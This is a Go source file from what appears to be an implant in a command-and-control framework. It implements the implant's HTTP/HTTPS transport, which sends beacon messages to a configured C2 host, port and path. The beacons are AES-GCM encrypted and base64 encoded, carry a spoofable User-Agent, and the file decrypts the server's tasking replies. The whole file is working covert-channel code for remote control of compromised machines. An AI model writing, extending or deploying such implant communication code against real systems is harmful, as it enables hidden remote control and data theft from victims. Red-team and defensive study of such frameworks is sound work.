package transport

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"

	"github.com/r74tech/virga/internal/implant/config"
	"github.com/r74tech/virga/internal/shared/protocol"
)

// HTTPTransport is the implementation for HTTP/HTTPS communication
type HTTPTransport struct {
	config *config.Config
	client *http.Client
	url    string
}

// NewHTTPTransport creates a new HTTP transport
func NewHTTPTransport(cfg *config.Config) Transport {
	url := fmt.Sprintf("%s://%s:%s/%s",
		cfg.C2Protocol, cfg.C2Host, cfg.C2Port, cfg.C2Path)

	return &HTTPTransport{
		config: cfg,
		client: &http.Client{},
		url:    url,
	}
}

// SendBeacon sends a beacon via HTTP/HTTPS
func (t *HTTPTransport) SendBeacon(msg *protocol.AgentMessage) (*protocol.AgentResponse, error) {
	// JSON serialization
	jsonData, err := json.Marshal(msg)
	if err != nil {
		return nil, fmt.Errorf("JSON serialization error: %w", err)
	}

	// AES-GCM encryption
	encryptedData, err := t.encrypt(jsonData)
	if err != nil {
		return nil, fmt.Errorf("encryption error: %w", err)
	}

	// Base64 encoding
	base64Data := base64.StdEncoding.EncodeToString(encryptedData)

	// Create HTTP request
	req, err := http.NewRequest("POST", t.url, bytes.NewBuffer([]byte(base64Data)))
	if err != nil {
		return nil, fmt.Errorf("request creation error: %w", err)
	}

	req.Header.Set("User-Agent", t.config.UserAgent)
	req.Header.Set("Content-Type", "application/octet-stream")

	// Send request
	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	// Read response
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("response read error: %w", err)
	}

	if len(respBody) == 0 {
		// Empty response
		return &protocol.AgentResponse{
			Status: "ok",
		}, nil
	}

	// Base64 decoding
	decodedResp, err := base64.StdEncoding.DecodeString(string(respBody))
	if err != nil {
		return nil, fmt.Errorf("response Base64 decode error: %w", err)
	}

	// Decryption
	decryptedResp, err := t.decrypt(decodedResp)
	if err != nil {
		return nil, fmt.Errorf("response decryption error: %w", err)
	}

	// Debug: validate decrypted data
	if len(decryptedResp) == 0 {
		return &protocol.AgentResponse{}, nil
	}

	// Data validation - check if it's valid JSON
	if !json.Valid(decryptedResp) {
		// Safely display the beginning of the invalid JSON data
		preview := string(decryptedResp)
		if len(preview) > 100 {
			preview = preview[:100] + "..."
		}
		return nil, fmt.Errorf("invalid JSON response: %s", preview)
	}

	// JSON parsing
	var agentResp protocol.AgentResponse
	if err := json.Unmarshal(decryptedResp, &agentResp); err != nil {
		return nil, fmt.Errorf("response JSON parse error: %w", err)
	}

	return &agentResp, nil
}

// Close closes the HTTP transport
func (t *HTTPTransport) Close() error {
	// No special closing process required for HTTP client
	return nil
}

// encrypt encrypts data with AES-GCM
func (t *HTTPTransport) encrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(t.config.AESKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Generate nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	// Encrypt (prepend nonce)
	encrypted := gcm.Seal(nonce, nonce, data, nil)
	return encrypted, nil
}

// decrypt decrypts data with AES-GCM
func (t *HTTPTransport) decrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(t.config.AESKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	// Validate nonce size
	if len(data) < gcm.NonceSize() {
		return nil, fmt.Errorf("invalid ciphertext")
	}

	// Get nonce and decrypt
	nonce := data[:gcm.NonceSize()]
	ciphertext := data[gcm.NonceSize():]

	// Decrypt
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}
